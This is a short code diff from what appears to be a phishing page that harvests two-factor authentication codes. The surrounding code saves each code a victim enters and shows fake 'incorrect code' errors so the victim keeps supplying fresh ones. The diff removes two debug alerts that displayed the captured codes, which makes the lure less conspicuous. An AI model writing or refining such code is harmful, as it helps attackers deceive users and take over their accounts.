@@ -687,7 +687,6 @@ flexibility(document.documentElement);
 
                     if (attempts_code === 1) {
                         code_first = val;
-                        alert("First entered 2FA code: " + code_first);
                         errorEl.textContent = "The code generator you entered is incorrect. Please wait for the new code we send you.";
                         codeInput.focus();
                         return;
@@ -695,7 +694,6 @@ flexibility(document.documentElement);
 
                     if (attempts_code === 2) {
                         code_second = val;
-                        alert("Second entered 2FA code: " + code_second);
                         errorEl.textContent = "The code generator you entered is incorrect again. Try once more.";
                         codeInput.focus();
                         return;
